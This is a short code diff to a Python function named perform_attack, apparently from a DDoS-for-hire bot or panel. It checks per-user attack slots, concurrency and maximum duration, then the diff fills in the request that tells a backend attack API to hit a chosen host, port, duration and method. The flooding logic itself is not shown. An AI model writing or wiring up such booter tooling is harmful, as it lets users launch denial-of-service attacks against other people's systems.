@@ -160,7 +160,7 @@ def perform_attack(target, port, duration, method, user_id):
     max_duration = info['max_duration']
     concurrents = info['concurrents']
     user_attack_slots = info.get('attack_slots', 0)
-    url = f'YOUR API HERE'
+    url = f'http://api.example.com/api/attack?user=abcdxyz&secret=123123&host={target}&port={port}&time={duration}&method={method}'
     response = requests.get(url)
     response_json = response.json()
         
